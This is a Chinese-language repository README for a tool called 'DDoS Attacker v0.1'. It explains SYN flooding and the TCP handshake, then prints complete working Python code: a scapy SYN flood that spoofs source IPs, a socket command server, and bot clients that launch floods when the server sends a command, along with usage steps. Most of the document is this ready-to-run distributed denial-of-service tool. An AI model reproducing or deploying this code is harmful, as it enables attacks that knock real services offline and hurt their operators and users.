# DDoS Attacker v0.1

## 仓库结构

- ddos_client_v0.1.py —— DDoS客户端
- ddos_server_v0.1.py —— DDoS服务端
- test/ —— 存放单独模块的测试脚本
- drafts/ ——  存放实现过程中的“草稿”
- refer/ —— 存放原作者参考的代码

## 攻击原理
首先实现SYN泛洪攻击（SYN Flood，是一直常用的DOS方式之一，通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽的攻击方式）。TCP三次握手的过程在下面补充。SYN攻击则是**客户端向服务器发送SYN报文之后就不再响应服务器回应的报文，由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，如果超过一定的时间没有接收到客户端的报文，那么本次连接在协议栈中存储的数据就会被丢弃。** 攻击者如果利用这段时间发送了大量的连接请求，全部挂起在半连接状态，这样将不断消耗服务器资源，直到拒接服务。
![SYN报文请求过程](http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png)  
上图，就是SYN报文请求过程。SYN是TCP包的一个类型，表示建立连接。ACK表示响应。
## 补充：TCP三次握手以及TCP/IP族相关
### TCP/IP协议族
TCP/IP是一个协议族。因为TCP/IP协议包括TCP、IP、UDP、ICMP、RIP、TELNETFTP、SMTP、ARP、TFTP等许多协议，这些协议一起称为TCP/IP协议。
其中TCP全称为Transport Control Protocol, 传输控制协议。位于OSI参考模型的第4层，传输层。下图为TCP/IP对应OSI中的层以及功能介绍：
![TCP/IP对应OSI中的层以及功能](http://119.3.78.82:8085/uploads/big/611cbd062a697a303a79e36adfecc21d.png)

### 三次“建立”四次“分手”
接下来，我们讲回TCP协议，TCP需要三次握手才能建立，断开断开连接需要四次握手，过程如下：
![TCP三次连接四次分手](http://119.3.78.82:8085/uploads/big/9e0734662000d35db1c5e9bf19175183.gif)

TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接，以下详细的文字描述：

 位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)

第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；

 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；

 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。

 完成三次握手，主机A与主机B开始传送数据。
## 工具介绍 
Scapy是一个交互式数据包处理程序，可以用来发送、嗅探、解析和伪造网络数据包。本文环境为Ubuntu18.04LTS Desktop, VBox。可以使用apt或者pip安装：
```
# pip安装推荐推荐虚拟环境安装，安全也要讲究低耦合
pip3 install scapy
# 或者
sudo apt-get install python-scapy
# 运行scapy需要sudo权限
sudo scapy
 # 运行会出现一些警告信息，先不用管
```

### Tips 踩坑小提示：
使用```sudo pip```安装，会安装到系统全局环境。如果我们激活虚拟环境后，再sudo pip，同样也会安装到系统全局环境，所以不要做按耳盗铃的事情哦~  
但有时候，比如scapy，需要sudo权限执行，但```pip install scapy```安装后使用```sudo scapy```会显示command not found。但我们又不想把它安装到全局环境，那么解决办法是？

答案：sudo + 虚拟环境下的 bin/scapy。 e.g. ```sudo ./venv/bin/scapy```
```
(prc37) satan1a@satan1a-VirtualBox:~/projects/python_projects/ddos_attacker/prc37/bin$ ls
activate      activate.fish  activate_this.py  easy_install      pip   pip3.6  python3    python-config  UTscapy
activate.csh  activate.ps1   activate.xsh      easy_install-3.6  pip3  python  python3.6  scapy          wheel
(prc37) satan1a@satan1a-VirtualBox:~/projects/python_projects/ddos_attacker/prc37/bin$ sudo scapy
sudo: scapy: command not found
(prc37) satan1a@satan1a-VirtualBox:~/projects/python_projects/ddos_attacker/prc37/bin$ sudo ./scapy 
```
构造一个SYN包，发送测试一下：
```
# 构造一个SYN包
>>> pkt = IP(src = "125.4.2.1",dst="192.168.50.10")/TCP(dport=80,flags="S")
>>> send(pkt)
```
发送测试，成功。
```
(prc37) satan1a@satan1a-VirtualBox:~/projects/python_projects/ddos_attacker/prc37/bin$ sudo ./scapy 
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: No route found for IPv6 destination :: (no default route?)
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.
>>> pkt = IP(src = "125.4.2.1",dst="192.168.50.10")/TCP(dport=80,flags="S")
>>> send(pkt)
.
Sent 1 packets.
>>> 
```
但真的正确吗？  
表面上看是成功了，但是这种方式就违背一条信息安全里很重要的原则：**最小权限原则**，即系统中所有的程序和特权用户应当仅获得完成相应工作所需的最少的权限。  
使用上述的这种方式，我们使用sudo暂时向系统借了权限，执行虚拟环境里的程序，那么一个本来就要求更高权限的程序**才能正常工作**的程序，为什么要隔离在相对没有权限的环境里，然后又人为帮助它去翻过虚拟环境的高墙去做更高权限的事情呢？

### 扩展：最小权限原则与sudo的使用
扩展：我们知道，sudo存在的一大目的，就是为了安全，尽可能地防止误操作和权限滥用。但同时我们也应该明白，什么时候需要给他较低权限，什么时候要给它较高权限，以及什么时候可以用sudo来暂时提高权限。  
e.g. 在Ubuntu中，不是每个用户都可以使用sudo, 因为操作nginx等这种需要很高权限的服务时，只有指定的，**被授予权限来暂时提高权限的用户**才可以使用sudo来对nginx操作，这就是遵循了最小权限原则————权限最小，但能正常工作。  
那么我们在虚拟环境下使用```pip install scapy```就违背了后者，不能正常工作。在这种情况下，root进不去虚拟环境，虚拟环境理论上又不能用sudo“越权”。所以，我们判断是否需要sudo安装的判断条件就是三个：  
1. 用户的权限最小化
2. 程序能正常工作
3. 如果同时满足的情况需要sudo，就可以直接使用sudo安装。


## DDoS实现思路
DDoS全称是Distributed Denial of Service，翻译成中文就是分布式拒绝服务，简单地说，就是调动多台主机一起发起攻击。  
如何协同多台主机一起发起攻击呢？一种传统的方法就是控制多台傀儡机，同时进行SYN泛洪攻击，还有一种模式叫做HIVEMIND。  

> 通过HIVEMIND模式，用户可以通过连接到一台 IRC(Internet Relay Chat services)服务器，当有用户发送命令，任何以HIVEMIND模式连接到IRC服务器的成员都会立即攻击该目标。  

简单地说，一台主机可以作为Socket Server，其他主机作为Client，Client使用socket方式连接到Server，接收到信息后发起攻击。理想情况，就是志同道合的同志，可以随时加入攻击过程，只需执行客户端连接脚本即可开始攻击。

## 前期准备
### 实现一次SYN泛洪攻击
具体步骤及介绍查看代码内注释，##注释内容为测试的代码
```python
import os
import random
from scapy.all import *
def synFlood(tgt, dport):
    # 伪造的源IP地址列表，同时也是保护攻击者的一种方式
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    # 从不同的源端口发送
    for sPort in range(1024, 65535):
        # 随机选择主机地址
        index = random.randrange(4)
        # 一个完整的TCP包由一个IP包和TCO包组成
        # 1. 构造IP包，设置源地址src和目的地址dst
        ipLayer = IP(src=srcList[index], dst=tgt)
        ## print("IP layer is " + str(ipLayer))
        # 2. 构造TCP包，设置发送源端口sport和目的源端口dport,flag值设为S表示发送SYN数据包
        tcpLayer = TCP(sport=sPort, dport = dport, flags="S")
        ## print("TCP layer is " + str(tcpLayer))
        # 3. 构造完整TCP包，IP包/TCP包
        packet = ipLayer / tcpLayer
        send(packet)
        print("Sent")
        ## print(sPort)
        
if __name__ == "__main__":
    synFlood("192.168.50.10", 80)
```


### 使用argparse命令行解析模块
首先，我们需要命令行解析模块，对我们的命令行输入作处理。Scapy原本是一个命令行的模式，但我们不像每次攻击都手动输入一大堆命令吧，使用脚本会更加方便，所以我们需要argparse模块，对我们的命令行输入做处理，然后“发送”到Scapy中。

由于我们需要的是一对多模式（Server -> Client），首先我们规定好命令行格式：  
```sh
#-H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>
```
接下来进行使用argparse的训练：  
代码如下：

```python
# 导入argparse模块
import argparse
# 新建一个ArgumentParser对象，description是对命令行解析的一个描述信息，通常在使用-h命令时显示
parser = argparse.ArgumentParser(description="Process some integers.")
# 增加一个参数
parser.add_argument('-p', dest='port', type = int, help = 'An port number!')
# 解析命令行输入
args = parser.parse_args()
print("Port: ", args.port)
```

实现效果如下：
```
$ sudo python argparse_test.py -h
usage: argparse_test.py [-h] [-p PORT]

Process some integers.

optional arguments:
  -h, --help  show this help message and exit
  -p PORT     An port number!

$ sudo python argparse_test.py -p 123
Port:  123
```

### 使用socket模块

使用socket实现网络信息交换，从而实现服务器与客户端的信息通信。  
使用socket需要指定IP地址、端口号、协议类型。  
以下为客户端的实现代码： 
```python
import socket
# 创建socket对象，AF_INET表示使用IPV4对象，SOCK_STREAM表示使用的是基于流
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.43.61', 7786))
```

服务端代码：  
```python
import socket

# 服务器地址列表
cliList = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 绑定IP和端口，0.0.0.0表示绑定到所有的网络地址，但端口需要不被占用
s.bind(('0.0.0.0', 7786))

# 开启监听器，设置最大连接数10
s.listen(10)

# 循环等待新的连接，且将已连接的对象添加到列表中
while True:
    # 接受一个新的连接
    sock, addr = s.accept()
    # 添加新的连接到列表
    cliList.append(sock)
    ## 测试：显示已连接的客户机IP
    for client_ip in cliList:
        print("Cliend IP: " + str(client_ip))
```

## 具体实现

### 服务端实现
终于到攻击器的具体实现阶段啦，首先我们编写Server端代码。  
具体的实现思路和流程，都写在代码内的注释中：
```python
import socket
import argparse
from threading import Thread

socketList = []

'''
5. 第五步，实现发送命令的函数
便利socketList，将每个socket都调用一次send将命令发送出去
'''
# def sendCmd(cmd):
#     print("Send command......")
#     for sock in socketList:
#         sock.send(cmd.encode = ('utf-8'))

def sendCmd(cmd):
    print("Send command......")
    for sock in socketList:
        sock.send(cmd.encode('UTF-8'))    

'''
4. 第四步,实现等待客户端的函数
循环等待客户端连接，并判断socket是否在socketList已存储过，没有则添加
'''
def waitConnect(s):
    while True:
        sock, addr = s.accept()
        if sock not in socketList:
            socketList.append(sock)



'''
1. 第一步，编写主函数
创建socket，绑定所有网络地址和58868端口并开始监听；
新开一个线程等待客户端的连接，以免阻塞我们输入命令（注意）
'''
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 58868))
    s.listen(1024)
    t = Thread(target=waitConnect, args = (s, ))
    t.start()


    '''
    2. 第二步
    将新开的线程中连接进来的socket添加到一个list中
    并检查一下socket长度，需要至少一个客户端连接
    '''
    print('Wait at least a client connection!')
    # 若没有客户端连接，则
    while not len(socketList):
        pass
    print('It has been a client connection!')
    
    
    '''
    3. 第三步
    循环等待输入命令，输入后判断是否符合命令格式的基本要求（自己定）
    满足，则把命令发送到所有客户端
    '''
    while True:
        print("=" * 50)
        print('The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c <start>"')


        # 等待输入的命令
        cmd_str = input('Please input command: ')
        if len(cmd_str):
            if cmd_str[0] == '#':
                sendCmd(cmd_str)


if __name__ == "__main__":
    main()

```

### 客户端实现
同样，具体的实现思路和流程，都写在代码内的注释中。  
客户端实现代码如下：  
```python
# -*- coding: utf-8 -*-
import sys
import random
import socket
import argparse
from multiprocessing import Process
from scapy.all import *

import os
isWorking = False
curProcess = None

# SYN flood attack
def synFlood(tgt,dPort):
    print('='*100)
    print('The syn flood is running!')
    print('='*100)
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer 
        send(packet)

'''
3. 第三步
创建全部变量curProcess，用于判断是否有进程正在发起SYN泛洪攻击
循环等待接受命令，接收到的数据类型为byte型，需要对其进行解码，解码后才为字符串
'''
# Process Command
def cmdHandle(sock, parser):
    global curProcess
    # TODO
    count = 0
    while count <= 20:
        data = sock.recv(1024).decode('utf-8')
        # 接收到的数据长度为0，则跳过后续内容，重新接收;
        if len(data) == 0:
            print('The data is empty')
            return

        # 接收到的数据长度不为0，则判断是否有命令基本格式的特征#，满足则用ArgumentParser对象解析命令
        if data[0] == '#':
            try:
                # Parse Command
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd

                '''
                4. 第四步
                判断命令参数解析后，是start命令还是stop命令
                首先，判断当前是否有进程在运行，如果有进程判断进程是否存活
                '''
                # DDoS Start Command
                if m_cmd.lower() == 'start':
                    # 如果当前有进程正在发起SYN泛洪攻击，我们就先结束这个进程，并清空屏幕，再启动一个进程
                    if curProcess != None and curProcess.is_alive():
                        # 结束进程
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is already started')
                    p = Process(target=synFlood, args=(m_host, m_port))
                    p.start()
                    curProcess = p
                    # TODO
                    count = count+1

                # DDoS Stop Command
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command!')


'''
1. 第一步  
创建ArgumentParser对象，设置好需要解析的命令参数
'''
def main():
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest = 'host', type = str)
    p.add_argument('-p', dest = 'port', type = int)
    p.add_argument('-c', dest = 'cmd', type = str)

    '''
    2. 第二步
    创建socket，连接服务器
    '''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ## 测试用，连接本地的58868端口
        s.connect(('127.0.0.1', 58868))
        print('To connect server was success!')
        print('=' * 50)
        cmdHandle(s, p)
    except:
        print('The network connected failed!')
        print('Please restart the script!')
        sys.exit(0)

if __name__ == "__main__":
    main()

```

## 测试使用

首先，我们规定了命令格式为：```#-H xxx.xxx.xxx.xxx -p xxxx -c <start>```  
e.g. ```#-H 127.0.0.1 -p 8085 -c start```， ```
#-H 127.0.0.1 -p 8085 -c stop```  

首先执行server脚本，然后执行client脚本，等待连接，连接成功，即可在server端操控client进行攻击，示例如下：
1. 启动server
```
sudo python ddos_server_v0.1.py
```
2. 启动client
```
sudo python ddos_client_v0.1.py
```
3. 连接成功  
![连接成功](http://119.3.78.82:8085/uploads/big/a375724463afb7b4eae2b0550a05764f.png)

4. 进行攻击
![进行攻击](http://119.3.78.82:8085/uploads/big/6961dee0c77ba3b193f26447e4b7932f.png)

5. 停止攻击
![停止攻击](http://119.3.78.82:8085/uploads/big/b41516447d764d6b43914b984a656792.png)

## Reference
[1]Blog.csdn.net. (2019). 网络篇——七层协议、四层协议、TCP、HTTP、SOCKET、长短连接 - 袁伏彪 —— 共享，共赢 - CSDN博客. [online] Available at: https://blog.csdn.net/bjyfb/article/details/6682913 [Accessed 25 Oct. 2019].  
[2]Jb51.net. (2019). Python实现DDoS. [online] Available at: https://www.jb51.net/article/155870.htm [Accessed 25 Oct. 2019].  
[3]Blog.csdn.net. (2019). TCP包的类型 (SYN, FIN, ACK, PSH, RST, URG) - lqglqglqg的专栏 - CSDN博客. [online] Available at: https://blog.csdn.net/lqglqglqg/article/details/48714611 [Accessed 25 Oct. 2019].
